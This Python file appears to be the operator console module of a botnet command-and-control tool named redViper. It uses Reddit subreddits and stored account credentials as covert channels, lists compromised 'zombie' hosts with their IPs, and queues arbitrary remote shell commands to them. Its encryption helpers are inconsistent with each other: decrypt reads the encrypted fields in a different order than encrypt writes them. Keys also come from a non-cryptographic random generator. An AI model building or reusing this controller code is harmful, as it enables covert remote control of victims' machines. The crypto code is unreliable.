#!/usr/bin/env python3


import random
import string
import time
from Crypto.Cipher import AES
from Crypto import Random
import base64
import configparser
import os
import sys

from channel import channel
from channel import master_account

import globals
import ui
import database
import zombie



def encrypt(aes_key, plaintext_data):

	iv = buildRandom(16)
	bogusAes = buildRandom(32)
	encryptor = AES.new(aes_key, AES.MODE_CFB, iv)
	rawData = encryptor.encrypt(plaintext_data)
	data = base64.b64encode(rawData).decode('utf-8')

	second_encryptor = AES.new(buildRandom(14+18), AES.MODE_CFB, iv)
	encrypted_bogus = second_encryptor.encrypt(bogusAes)
	encrypted_bogus_based = base64.b64encode(encrypted_bogus).decode('utf-8')
	enc = f"{encrypted_bogus_based}:{iv}:{data}"

	return enc

def decrypt(aes_key, enc_data):

	iv = enc_data.split(":")[0]
	raw_based = enc_data.split(":")[1]
	raw = base64.b64decode(raw_based)
	decryptor = AES.new(aes_key, AES.MODE_CFB, iv)
	plainData = decryptor.decrypt(raw)
	return plainData.decode('utf-8')

def getSessionKey(implant_key, enc_data_full):

	based_key = enc_data_full.split(":")[0]
	iv = enc_data_full.split(":")[1]
	encrypted_key = base64.b64decode(based_key)
	key_decryptor = AES.new(implant_key, AES.MODE_CFB, iv)
	plain_session_key = key_decryptor.decrypt(encrypted_key)
	return plain_session_key.decode('utf-8')



def buildRandom(length):

	lettersAndDigits = string.ascii_letters + string.digits
	out = ''.join(random.choice(lettersAndDigits) for i in range(length))
	return out


def generateBogusID():

	id = "{" + buildRandom(6) + "-" + buildRandom(8) + "-" + buildRandom(3) + "-" + buildRandom(8) + "}"
	return id


def watchTimes():

	while True:
		database.checkCheckInTimes()
		time.sleep(30)


def parseDbConfig():

	cfg_file = globals.CFG_FILE

	config = configparser.ConfigParser()

	if os.path.exists(cfg_file) == False:
		
		print(f"{ui.RED_MINUS} Could not locate redViper configuration file.")
		sys.exit(1)

	else:
	
		config.read(cfg_file)
		return config["mysql"]


def parseChannelConfig():

	cfg_file = globals.CFG_FILE

	config = configparser.ConfigParser()
	
	if os.path.exists(cfg_file) == False:
	
		print(f"{ui.RED_MINUS} Could not locate redViper configuration file.")
		sys.exit(1)

	else:
		
		config.read(cfg_file)
		
		channel_list = []
		for key in config.keys():
		
			if "master" in key:
		
				account = config[key]
				account_id = key.split("-")[1]
				user = account[ account_id + "_USER" ]
				passwd = account[ account_id + "_PASS" ]
				secret = account[ account_id + "_SECRET" ]
				client = account[ account_id + "_CLIENT" ]
				subreddits = account[ account_id + "_SUBS" ].split(",")
				
				newAccount = master_account(user, passwd, secret, client)

				for sub in subreddits:
					newChannel = channel(sub, newAccount)
					channel_list.append(newChannel)


		return channel_list


def parseMainCommand(userInput):

	if len(userInput) == 0:		
		# no input, just return 0 and go on
		return 0 
	else:
		actionWord = userInput.split(" ")[0]

	if actionWord in globals.EXIT_COMMANDS:

		prompt = f'{ui.BLUE_QUESTION} Are you sure you want to exit? (y/n): '
		verifyExit = input(prompt).lower().strip()
		
		if verifyExit == "no" or verifyExit == "n":
			return 0

		elif verifyExit == "yes" or verifyExit == "y":
			return 255

		else:	
			print(f"{ui.RED_MINUS} Invalid Confirmation. Cancelling exit . . .")
			return 1


	elif actionWord in globals.LIST_COMMANDS:
	
		ui.printZombies(database.listZombiesSummary())
		return 0 

	elif actionWord in globals.CONTROL_COMMANDS:

		try:
	
			db_id = userInput.split(" ")[1]

		except IndexError:

			print(f"{ui.RED_MINUS} Please specifying the ID of the zombie you want to interact with.")
			return 1

		# a lot of people are going to specify the zombie id instead of the database id.
		# this ValueError check is a quick way to tell when this is occurring, and create
		# a specialized error for it instead of a generic one.
		try:
	
			ver = int(db_id)

		except ValueError:

			print(f"{ui.RED_MINUS} Specified ID should be an integer. Make sure you specify the 'ID', not the 'Zombie ID'.")
			return 1

		zd = database.getZombieByDbID(db_id)
		if not zd:
			print(f"{ui.RED_MINUS} Could not find zombie with specified Database ID.")
			return 1

		# def __init__(self, channel, associated_account, zid, aes_key, implant_id, hostname, priv_ip, pub_ip, platform, first_check, last_check):
		chan = None
		availableChannels = parseChannelConfig()
		for channel in availableChannels:
			if channel.subreddit == zd[2]:
				chan = channel
		zombieObj = zombie.zombie(chan, zd[3], zd[1], zd[4], zd[5], zd[6], zd[8], zd[7], zd[9], zd[10], zd[11])
		return zombieObj

	elif actionWord in globals.HELP_COMMANDS:
		ui.printHelpMenu()
		return 0

	else:
		print(f"{ui.RED_MINUS} Unrecognized command.")
		return 1

def parseInteractCommand(userInput, zombie):

	if len(userInput) == 0:		
		# no input, just return 0 and go on
		return 0 
	else:
		actionWord = userInput.split(" ")[0]

	if actionWord in globals.CMD_COMMANDS:
		command = " ".join(userInput.split(" ")[1:])
		cmd_id = buildRandom(random.randint(6,8))
		zombie.reqCmd(command, cmd_id)
		print(f"{ui.notif_yellow()} Command request has been sent. Any expected output should be received within the next minute or so. (Command ID: {ui.WHITE_B}{cmd_id}{ui.RESET})")
		return 0 

	elif actionWord in globals.BACK_COMMANDS:
		return 127

	elif actionWord in globals.INFO_COMMANDS:
		fullData = database.getZombieDataByZid(zombie.zid)
		ui.printZombieDataPretty(fullData)
		return 0

	elif actionWord in globals.KILL_COMMANDS:
		prompt = f'{ui.BLUE_QUESTION} Are you sure you want to terminate this zombie? (y/n): '
		verifyTerm= input(prompt).lower().strip()
		
		if verifyTerm == "no" or verifyTerm == "n":
			return 0

		elif verifyTerm == "yes" or verifyTerm == "y":
			
			# send termination command in zombie object; I'll add the code to kill the implant code itself later on; for now its
			# just for clean up of server.
			database.deleteZombieByZid(zombie.zid)
			print(f"{ui.notif_yellow()} Zombie instance has been terminated.")
			return 127

		else:	
			print(f"{ui.RED_MINUS} Invalid Confirmation. Cancelling termination . . .")
			return 1

	else:

		return parseMainCommand(userInput)












			
		




					

				
